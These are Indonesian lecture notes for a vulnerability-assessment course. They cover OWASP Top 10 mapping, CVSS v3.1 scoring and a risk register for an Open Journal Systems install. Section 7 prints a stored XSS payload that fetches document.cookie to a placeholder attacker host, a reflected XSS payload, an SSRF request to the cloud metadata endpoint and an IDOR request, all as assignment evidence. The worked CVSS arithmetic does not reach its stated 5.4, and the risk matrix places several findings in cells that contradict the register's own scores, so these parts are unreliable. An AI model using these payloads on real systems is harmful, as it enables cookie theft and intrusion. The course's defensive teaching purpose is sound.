# Pertemuan 4 — Analisis OWASP & Risk Scoring

## Tujuan Pembelajaran
Setelah pertemuan ini, mahasiswa mampu:
1. Memetakan temuan scanning ke kategori OWASP Top 10 2021
2. Menghitung risk score menggunakan CVSS v3.1
3. Memprioritaskan kerentanan berdasarkan tingkat risiko
4. Menyusun Risk Register yang terstruktur

---

## 1. OWASP Top 10 — 2021

OWASP Top 10 adalah daftar 10 risiko keamanan aplikasi web yang paling kritis, diperbarui secara berkala oleh komunitas OWASP.

| Kode | Kategori | Relevansi pada OJS |
|---|---|---|
| **A01** | Broken Access Control | IDOR pada API, escalasi hak akses Editor→Admin |
| **A02** | Cryptographic Failures | Password hashing lemah, transmisi data sensitif tanpa HTTPS |
| **A03** | Injection | SQL Injection, XSS, SSTI pada template |
| **A04** | Insecure Design | Logika bisnis review yang dapat dimanipulasi |
| **A05** | Security Misconfiguration | Directory listing, header keamanan hilang, default credentials |
| **A06** | Vulnerable & Outdated Components | OJS 3.3.0-8 dengan CVE terdokumentasi, PHP 7.4 EOL |
| **A07** | Identification & Authentication Failures | Tidak ada lockout, reset password insecure |
| **A08** | Software & Data Integrity Failures | Plugin upload tanpa verifikasi integritas |
| **A09** | Security Logging & Monitoring Failures | Log tidak memadai, tidak ada alerting |
| **A10** | Server-Side Request Forgery (SSRF) | CVE-2021-27188 pada journal settings |

---

## 2. Pemetaan Temuan ke OWASP Top 10

### Cara Kerja Pemetaan

Setiap temuan dari Pertemuan 3 harus dipetakan ke:
1. **Kategori OWASP** (A01–A10)
2. **CWE (Common Weakness Enumeration)** — nomor kelemahan
3. **CVE** (jika ada kerentanan yang sudah terdaftar)

### Contoh Pemetaan Temuan OJS

| ID Temuan | Deskripsi | OWASP | CWE | CVE |
|---|---|---|---|---|
| VUL-001 | Stored XSS pada field abstrak artikel | A03 | CWE-79 | CVE-2020-28112 |
| VUL-002 | SQL Injection pada parameter search | A03 | CWE-89 | - |
| VUL-003 | SSRF melalui journal stylesheet URL | A10 | CWE-918 | CVE-2021-27188 |
| VUL-004 | Upload plugin tanpa validasi integritas | A08 | CWE-349 | - |
| VUL-005 | Directory listing pada `/ojs/cache/` | A05 | CWE-548 | - |
| VUL-006 | Tidak ada rate limiting pada login | A07 | CWE-307 | - |
| VUL-007 | Versi OJS terekspos di HTTP header | A05 | CWE-200 | - |
| VUL-008 | Cookie session tanpa flag `HttpOnly` | A05 | CWE-1004 | - |
| VUL-009 | XSS via Open Redirect parameter | A03 | CWE-601 | CVE-2022-24822 |
| VUL-010 | IDOR pada API `/api/v1/users/{id}` | A01 | CWE-639 | - |

---

## 3. CVSS v3.1 — Scoring Kerentanan

### 3.1 Apa itu CVSS?

**CVSS (Common Vulnerability Scoring System)** adalah standar industri untuk menilai tingkat keparahan suatu kerentanan. Skor berkisar dari **0.0 (None)** hingga **10.0 (Critical)**.

### 3.2 Komponen CVSS v3.1

#### Base Score Metrics

**Attack Vector (AV) — Vektor Serangan:**

| Nilai | Kode | Deskripsi | Skor |
|---|---|---|---|
| Network | N | Exploitable dari jaringan | 0.85 |
| Adjacent | A | Perlu akses jaringan yang sama | 0.62 |
| Local | L | Akses lokal diperlukan | 0.55 |
| Physical | P | Akses fisik ke perangkat | 0.20 |

**Attack Complexity (AC) — Kompleksitas Serangan:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| Low (L) | Tidak ada kondisi khusus yang diperlukan | 0.77 |
| High (H) | Memerlukan kondisi tertentu yang tidak selalu terpenuhi | 0.44 |

**Privileges Required (PR) — Hak Akses yang Dibutuhkan:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak perlu autentikasi | 0.85 |
| Low (L) | Autentikasi dasar diperlukan | 0.62 / 0.50 |
| High (H) | Hak akses tinggi (Admin) | 0.27 / 0.50 |

**User Interaction (UI) — Interaksi Pengguna:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak diperlukan interaksi korban | 0.85 |
| Required (R) | Korban harus melakukan tindakan | 0.62 |

**Scope (S) — Dampak Scope:**

| Nilai | Deskripsi |
|---|---|
| Unchanged (U) | Komponen yang terpengaruh sama dengan komponen yang dieksploitasi |
| Changed (C) | Exploit dapat mempengaruhi komponen di luar scope awal |

**Confidentiality, Integrity, Availability (C/I/A) Impact:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak ada dampak | 0.00 |
| Low (L) | Dampak terbatas | 0.22 |
| High (H) | Dampak total/sepenuhnya terpengaruh | 0.56 |

### 3.3 Interpretasi Skor CVSS

| Skor | Rating | Tindakan yang Disarankan |
|---|---|---|
| 0.0 | None | Tidak ada tindakan |
| 0.1 – 3.9 | Low | Perbaiki dalam siklus rutin |
| 4.0 – 6.9 | Medium | Perbaiki dalam 30 hari |
| 7.0 – 8.9 | High | Perbaiki dalam 7 hari |
| 9.0 – 10.0 | Critical | Perbaiki segera (hotfix) |

---

## 4. Contoh Kalkulasi CVSS — Studi Kasus OJS

### Kasus 1: Stored XSS — VUL-001

**Skenario:** Attacker yang memiliki akun Author dapat menyisipkan script berbahaya pada field abstrak jurnal. Script akan dieksekusi saat Editor/admin membuka halaman review.

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

Penjelasan:
  AV:N  → Bisa dieksploitasi via internet (Network)
  AC:L  → Tidak ada kondisi khusus (Low complexity)
  PR:L  → Butuh akun Author (Low privilege)
  UI:R  → Korban (Editor) harus membuka halaman (Required)
  S:C   → JS dapat mengakses session Editor → scope Changed
  C:L   → Session cookie dapat dicuri (Low confidentiality impact)
  I:L   → Data dapat dimodifikasi terbatas (Low integrity impact)
  A:N   → Tidak ada gangguan availability

Base Score: 5.4 → MEDIUM
```

**Kalkulasi Manual:**
$$\text{ISC}_{base} = 1 - (1-0.22) \times (1-0.22) \times (1-0) = 0.398$$

$$\text{ISS} = 7.52 \times [0.398-0.029] = 2.78 \quad (\text{Scope Changed} \Rightarrow \times 1.08)$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.62 = 1.69$$

$$\text{Base Score} = \text{Roundup}\left( \min(1.08 \times (2.78 + 1.69), 10) \right) = 5.4$$

---

### Kasus 2: SSRF — VUL-003 (CVE-2021-27188)

**Skenario:** Editor/Journal Manager dapat mengatur URL stylesheet yang diolah server-side, memungkinkan akses ke internal service (database, metadata cloud).

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

Penjelasan:
  AV:N  → Exploitable via network
  AC:L  → Tidak ada kondisi khusus
  PR:L  → Butuh akun Editor (Low privilege)
  UI:N  → Tidak butuh interaksi korban
  S:C   → Dapat mengakses internal service → Changed
  C:H   → Potensi baca konfigurasi server, token cloud (High)
  I:N   → Tidak memodifikasi data
  A:N   → Tidak mengganggu availability

Base Score: 7.7 → HIGH
```

---

### Kasus 3: SQL Injection — VUL-002

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Penjelasan:
  AV:N  → Via internet
  AC:L  → Tidak butuh kondisi khusus
  PR:N  → Tidak perlu login (parameter publik)
  UI:N  → Tidak perlu interaksi
  S:U   → Tidak keluar scope
  C:H   → Bisa baca semua data (termasuk password hash)
  I:H   → Bisa tulis/hapus data
  A:H   → Bisa DROP TABLE

Base Score: 9.8 → CRITICAL
```

---

## 5. Risk Register

### 5.1 Formula Risk (OWASP Risk Rating Methodology)

```
Likelihood = (Threat Agent Factors + Vulnerability Factors) / 2
Impact     = (Technical Impact + Business Impact) / 2
Risk Score = Likelihood × Impact
```

### 5.2 Risk Register OJS — Template Terisi

| ID | Kerentanan | OWASP | CVSS Score | Rating | Likelihood | Business Impact | Risk | Prioritas |
|---|---|---|---|---|---|---|---|---|
| VUL-001 | Stored XSS abstrak | A03 | 5.4 | Medium | 3 (Medium) | 4 (Tinggi — reputasi) | **Medium** | 3 |
| VUL-002 | SQL Injection search | A03 | 9.8 | Critical | 4 (High) | 5 (Kritis — kebocoran data) | **Critical** | 1 |
| VUL-003 | SSRF journal settings | A10 | 7.7 | High | 3 (Medium) | 4 (Tinggi — infrastruktur) | **High** | 2 |
| VUL-004 | Upload plugin no verify | A08 | 8.0 | High | 2 (Low) | 5 (Kritis — RCE) | **High** | 2 |
| VUL-005 | Directory listing cache | A05 | 5.3 | Medium | 5 (Very High) | 2 (Rendah) | **Medium** | 4 |
| VUL-006 | No login rate limiting | A07 | 5.3 | Medium | 4 (High) | 3 (Sedang) | **Medium** | 4 |
| VUL-007 | Versi exposed di header | A05 | 3.7 | Low | 5 (Very High) | 1 (Info) | **Low** | 6 |
| VUL-008 | Cookie tanpa HttpOnly | A05 | 4.3 | Medium | 3 (Medium) | 3 (Sedang) | **Medium** | 5 |
| VUL-009 | XSS via Open Redirect | A03 | 6.1 | Medium | 3 (Medium) | 3 (Sedang) | **Medium** | 4 |
| VUL-010 | IDOR pada Users API | A01 | 6.5 | Medium | 3 (Medium) | 4 (Tinggi — privasi) | **High** | 3 |

### 5.3 Likelihood Scale

| Skor | Level | Deskripsi |
|---|---|---|
| 1 | Very Low | Sulit dieksploitasi, butuh skill tinggi |
| 2 | Low | Membutuhkan kondisi tertentu |
| 3 | Medium | Aktor dengan kemampuan rata-rata bisa mengeksploitasi |
| 4 | High | Mudah dieksploitasi, banyak tools otomatis |
| 5 | Very High | Otomatis dan sangat mudah |

### 5.4 Business Impact Scale

| Skor | Level | Dampak |
|---|---|---|
| 1 | Minimal | Tidak ada dampak signifikan |
| 2 | Low | Gangguan minor, tidak ada data leak |
| 3 | Medium | Gangguan signifikan, reputasi terdampak |
| 4 | High | Kebocoran data pengguna, denda regulasi |
| 5 | Critical | Kompromi sistem penuh, RCE, data breach masif |

---

## 6. Visualisasi Risk Matrix

Petakan temuan ke dalam matriks 5×5:

```
         │  VERY    │         │         │         │  VERY   │
BUSN     │  LOW     │   LOW   │ MEDIUM  │  HIGH   │  HIGH   │
IMPACT   │   (1)    │   (2)   │   (3)   │   (4)   │   (5)   │
─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
VERY HIGH│          │         │         │         │         │
   (5)   │          │         │ VUL-007 │         │         │
─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
HIGH     │          │         │         │ VUL-002 │         │
   (4)   │          │         │ VUL-005 │ VUL-006 │         │
─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
MEDIUM   │          │         │ VUL-008 │ VUL-001 │         │
   (3)   │          │         │ VUL-009 │ VUL-003 │         │
─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
LOW      │          │ VUL-004 │ VUL-010 │         │         │
   (2)   │          │         │         │         │         │
─────────┼──────────┼─────────┼─────────┼─────────┼─────────┤
VERY LOW │          │         │         │         │         │
   (1)   │          │         │         │         │         │
─────────┴──────────┴─────────┴─────────┴─────────┴─────────┘
         LIKELIHOOD (1=Very Low → 5=Very High)

Warna:  🔴 Critical  🟠 High  🟡 Medium  🟢 Low  ⚪ Info
```

---

## 7. Analisis Per Kategori OWASP

### A01 — Broken Access Control
**Temuan:** IDOR pada `/api/v1/users/{id}` memungkinkan Author mengakses data profil user lain tanpa otorisasi.

**Bukti:**
```http
GET /ojs/api/v1/users/1 HTTP/1.1
Host: <IP-VPS>
Authorization: Bearer <token_author>

Response:
{
  "id": 1,
  "username": "admin",
  "email": "admin@jurnal.ac.id",
  "fullName": "Site Administrator",
  ...
}
```

### A03 — Injection
**Temuan 1 — Reflected XSS pada search:**
```
URL: /ojs/index.php/$journal/search?query=<script>alert(document.cookie)</script>
Bukti: Script dieksekusi di browser korban
```

**Temuan 2 — Stored XSS pada abstrak:**
```
Payload: <img src=x onerror="fetch('http://<attacker>/steal?c='+document.cookie)">
Lokasi: Field abstrak submission
Target: Editor yang membuka halaman review
```

### A10 — SSRF
**Temuan — CVE-2021-27188:**
```
POST /ojs/index.php/$journal/management/settings/website
Body: styleSheet[uploadedFile]=http://169.254.169.254/latest/meta-data/

Response: AWS EC2 Instance Metadata (jika VPS di cloud AWS)
```

---

## 8. Deliverable Pertemuan 4

| No | Deliverable | Format | Dikumpulkan Via |
|---|---|---|---|
| 1 | Risk Register lengkap (semua temuan dari Pertemuan 3) | `.md` / Excel | GitHub |
| 2 | CVSS score calculation untuk minimal 5 temuan kritis | `.md` | GitHub |
| 3 | Risk matrix diagram (visual) | `.png` | GitHub |
| 4 | Pemetaan temuan ke OWASP Top 10 | `.md` | GitHub |
| 5 | Narasi analisis per kategori OWASP yang relevan | `.md` | GitHub |

---

## 9. Pertanyaan Diskusi

1. Mengapa sebuah kerentanan dengan CVSS **9.8 (Critical)** bisa memiliki *actual risk* yang lebih rendah dari CVSS **6.5 (Medium)** dalam konteks bisnis tertentu?

2. Jelaskan perbedaan **CVSS Base Score**, **Temporal Score**, dan **Environmental Score**! Mana yang paling relevan untuk laporan vulnerability assessment institusi pendidikan?

3. Dalam kasus OJS, apakah **A06 (Vulnerable & Outdated Components)** seharusnya mendapatkan skor tinggi? Jelaskan argumen Anda!

4. Seandainya Anda adalah CISO universitas yang menggunakan OJS, kerentanan mana (VUL-001 s/d VUL-010) yang akan Anda prioritaskan perbaikan pertama kali dan mengapa?

---

## Referensi
- OWASP Top 10 2021: https://owasp.org/Top10/
- NVD CVSS v3.1 Calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
- OWASP Risk Rating Methodology: https://owasp.org/www-community/OWASP_Risk_Rating_Methodology
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- First.org CVSS v3.1 Specification: https://www.first.org/cvss/specification-document
